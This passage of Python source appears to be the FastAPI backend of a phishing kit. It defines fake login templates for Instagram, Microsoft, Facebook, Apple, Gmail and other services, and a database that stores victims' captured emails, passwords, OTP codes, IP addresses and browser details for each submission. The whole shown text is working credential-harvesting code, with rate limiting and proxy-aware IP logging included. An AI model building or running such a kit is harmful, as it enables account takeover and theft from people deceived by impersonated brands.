app = FastAPI()

# Database setup
DB_PATH = "/app/data/captures.db"
os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)

# Available phishing templates
TEMPLATES = {
    "instagram": "Instagram Login",
    "microsoft": "Microsoft Sign In",
    "facebook": "Facebook Login",
    "netflix": "Netflix Login",
    "snapchat": "Snapchat Login",
    "twitter": "Twitter/X Login",
    "linkedin": "LinkedIn Login",
    "amazon": "Amazon Login",
    "apple": "Apple ID Login",
    "gmail": "Gmail Login",
    "otp": "Generic OTP Verification"
}

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            service TEXT,
            email TEXT,
            password TEXT,
            otp TEXT,
            honeypot TEXT,
            ip_address TEXT,
            user_agent TEXT,
            referer TEXT,
            attempt_number INTEGER
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS rate_limits (
            ip_address TEXT PRIMARY KEY,
            attempt_count INTEGER,
            last_attempt REAL,
            locked BOOLEAN
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# Rate limiting config
MAX_ATTEMPTS = 5
LOCKOUT_DURATION = 300  # 5 minutes
rate_limit_store = defaultdict(lambda: {"count": 0, "last_time": 0})

def check_rate_limit(ip: str) -> bool:
    """Check if IP is rate limited"""
    current_time = time.time()
    record = rate_limit_store[ip]

    if current_time - record["last_time"] > LOCKOUT_DURATION:
        record["count"] = 0

    record["last_time"] = current_time
    record["count"] += 1

    return record["count"] > MAX_ATTEMPTS

def log_capture(service: str, email: str, password: str, otp: str, honeypot: str, ip: str, ua: str, referer: str):
    """Log phishing attempt"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # Get attempt number for this email+service combination
    c.execute("SELECT COUNT(*) FROM captures WHERE email = ? AND service = ?", (email, service))
    attempt_num = c.fetchone()[0] + 1

    c.execute('''
        INSERT INTO captures
        (timestamp, service, email, password, otp, honeypot, ip_address, user_agent, referer, attempt_number)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (
        datetime.now().isoformat(),
        service,
        email,
        password,
        otp,
        honeypot,
        ip,
        ua,
        referer,
        attempt_num
    ))
    conn.commit()
    conn.close()

def get_client_ip(request: Request) -> str:
    """Extract real client IP (handles proxies)"""
    if "x-forwarded-for" in request.headers:
        return request.headers["x-forwarded-for"].split(",")[0].strip()
    return request.client.host

